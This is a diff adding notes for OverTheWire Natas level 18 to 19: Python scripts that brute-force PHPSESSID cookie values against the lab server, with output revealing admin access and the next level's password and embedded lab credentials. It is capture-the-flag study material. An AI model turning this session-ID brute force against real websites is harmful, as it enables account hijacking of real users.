@@ -536,4 +536,96 @@ Done!
 
 ## 18->19
 - http://natas18.natas.labs.overthewire.org/
-- `natas19:`
+- `natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr`
+- `PHPSESSID` Brute Force exploit
+- https://nils-maeurer.de/post/overthewire-natas18-19/
+- https://learnhacking.io/overthewire-natas-level-18-walkthrough/
+```python
+"""
+Dev Tools > Copy as cURL
+--
+
+curl 'http://natas18.natas.labs.overthewire.org/index.php?debug' \
+  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
+...
+"""
+
+# Implementation 1
+
+"""
+curl 'http://natas18.natas.labs.overthewire.org/index.php?debug' \
+  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
+"""
+
+import requests
+
+MAX = 640
+count = 1
+
+u = "http://natas18.natas.labs.overthewire.org"
+auth_header = {
+    'Authorization': 'Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==',
+}
+
+while count <= MAX:
+    sessionID = "PHPSESSID=" + str(count)
+    print(sessionID)
+
+    cookie = {"PHPSESSID": str(count)}
+    response = requests.get(url=u, headers=auth_header, cookies=cookie)
+
+    if "You are logged in as a regular user" not in response.text:
+        print(response.text)
+        break
+
+    count += 1
+
+print("Done!")
+
+# Implementation 2
+
+import requests
+import time
+
+auth_header = {
+    'Authorization': 'Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==',
+}
+
+url = 'http://natas18.natas.labs.overthewire.org'
+
+for i in range(1, 641):
+    print("Trying number %d" % i)
+    cookie = {"PHPSESSID": str(i)}
+    resp = requests.request(method='POST', url=url, headers=auth_header, cookies=cookie)
+    time.sleep(0.1)
+    if "You are an admin." in resp.text:
+        print(resp.text)
+        break
+```
+
+```bash
+...
+PHPSESSID=117
+PHPSESSID=118
+PHPSESSID=119
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+Done!
+```
